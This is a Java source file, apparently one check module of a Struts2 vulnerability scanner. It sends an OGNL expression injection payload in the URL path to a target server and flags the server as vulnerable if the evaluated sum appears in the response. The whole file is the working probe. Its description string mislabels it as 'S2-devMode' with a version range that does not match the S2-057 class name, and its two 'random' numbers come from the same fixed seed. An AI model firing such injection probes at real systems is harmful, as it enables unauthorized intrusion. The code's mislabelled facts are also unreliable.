package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.io.IOException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_057 implements Check {
    public String printInfo(){
        String info = "[+] S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {



        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = "${({number1}+{number2})}";
        poc = poc.replace("{number1}",String.valueOf(number1));
        poc = poc.replace("{number2}",String.valueOf(number2));

        int number = number1 + number2;

        String name = "";
        if(path ==null){
            path = "/";
            name = "index.action";
        }else if (path.endsWith(".action")){
            String[] pth = path.split("/");
            name = "/" + pth[pth.length - 1];
            path = "/"+pth[pth.length - 2] + "/";
        }else if(path.endsWith("/")){
            name = "/index.action";
        }

        poc = URLEncoder.encode(poc,"UTF-8");
        String url = protocol + "://" + host + ":" + port + path  + poc + name;
        HttpResult result = HttpClient.get(url);
        Pattern p = Pattern.compile(String.valueOf(number));
        Matcher m = p.matcher(result.getData());
        if (m.find()) {
            return true;
        } else {
            return false;
        }








    }

}
